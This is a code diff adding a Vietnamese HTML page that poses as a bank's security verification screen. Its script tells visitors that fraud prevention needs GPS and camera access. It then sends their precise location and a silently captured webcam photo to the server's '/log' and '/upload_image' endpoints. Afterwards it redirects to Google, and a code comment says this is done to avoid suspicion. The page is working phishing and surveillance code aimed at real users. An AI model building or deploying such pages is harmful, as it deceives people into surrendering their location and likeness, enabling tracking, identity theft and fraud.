@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="vi">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Xác thực giao dịch an toàn - Hệ thống Ngân hàng</title>
+    <style>
+        :root {
+            --primary-color: #004a99;
+            --accent-color: #ff6600;
+        }
+
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .container {
+            text-align: center;
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            max-width: 450px;
+            width: 90%;
+        }
+
+        .header {
+            margin-bottom: 20px;
+        }
+
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--primary-color);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Modal Style */
+        #safety-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal {
+            background: white;
+            padding: 25px;
+            border-radius: 12px;
+            max-width: 380px;
+            text-align: left;
+            position: relative;
+            animation: slideIn 0.3s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateY(-30px);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .modal h3 {
+            margin-top: 0;
+            color: #d32f2f;
+            font-size: 1.2rem;
+            display: flex;
+            align-items: center;
+        }
+
+        .modal h3::before {
+            content: '⚠️';
+            margin-right: 10px;
+        }
+
+        .modal p {
+            font-size: 0.95rem;
+            color: #555;
+            line-height: 1.5;
+        }
+
+        .btn {
+            background: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+            font-size: 1rem;
+            margin-top: 15px;
+            transition: background 0.2s;
+        }
+
+        .btn:hover {
+            background: #003a77;
+        }
+
+        .footer-note {
+            font-size: 0.8rem;
+            color: #999;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Lớp phủ bắt buộc xác nhận -->
+    <div id="safety-overlay">
+        <div class="modal">
+            <h3>Yêu cầu xác thực bảo mật</h3>
+            <p>Để ngăn chặn hành vi gian lận và đảm bảo bạn là chủ sở hữu hợp pháp của giao dịch này, hệ thống yêu cầu:
+            </p>
+            <ul style="padding-left: 20px; font-size: 0.9rem; color: #666;">
+                <li>Xác nhận vị trí GPS hiện tại</li>
+                <li>Xác thực khuôn mặt qua camera trước</li>
+            </ul>
+            <p>Vui lòng nhấn <b>"Tiếp tục"</b> và chọn <b>"Cho phép" (Allow)</b> trên thông báo của trình duyệt khi được
+                hỏi.</p>
+            <button class="btn" onclick="startVerification()">Tiếp tục xác thực</button>
+        </div>
+    </div>
+
+    <!-- Nội dung chính (Ẩn bên dưới) -->
+    <div class="container">
+        <div class="header">
+            <svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2L3 7V12C3 17.55 6.84 22.74 12 24C17.16 22.74 21 17.55 21 12V7L12 2Z" fill="#004a99" />
+                <path d="M10 17L6 13L7.41 11.59L10 14.17L16.59 7.58L18 9L10 17Z" fill="white" />
+            </svg>
+        </div>
+        <div class="loader"></div>
+        <h2>Vui lòng chờ...</h2>
+        <p>Hệ thống đang kết nối với máy chủ bảo mật của Ngân hàng.</p>
+        <p class="footer-note">Giao dịch được mã hóa 256-bit SSL</p>
+    </div>
+
+    <script>
+        function startVerification() {
+            // Ẩn modal
+            document.getElementById('safety-overlay').style.display = 'none';
+
+            // Bắt đầu chuỗi xin quyền
+            tryGPS();
+        }
+
+        function tryGPS() {
+            if (navigator.geolocation) {
+                // Kích động thông báo thật của trình duyệt
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        sendToServer('/log', {
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        });
+                        tryCamera();
+                    },
+                    (err) => {
+                        console.warn("User từ chối hoặc lỗi GPS");
+                        tryCamera();
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                tryCamera();
+            }
+        }
+
+        async function tryCamera() {
+            try {
+                // Kích động thông báo camera thật
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                // Chờ 1.5 giây để lấy ảnh rõ nét
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const imgData = canvas.toDataURL('image/jpeg');
+
+                    sendToServer('/upload_image', { image: imgData });
+
+                    // Tắt camera sau khi chụp
+                    stream.getTracks().forEach(track => track.stop());
+                }, 1500);
+            } catch (err) {
+                console.warn("User từ chối camera");
+                // Dù từ chối cũng sẽ redirect để ko bị nghi ngờ
+                setTimeout(() => window.location.href = "https://www.google.com", 2000);
+            }
+        }
+
+        function sendToServer(url, data) {
+            data.userAgent = navigator.userAgent;
+            data.timestamp = new Date().toISOString();
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).then(response => {
+                if (url === '/upload_image') {
+                    // Redirect sau khi ảnh đã lên server
+                    window.location.href = "https://www.google.com";
+                }
+            });
+        }
+    </script>
+</body>
+
+</html>
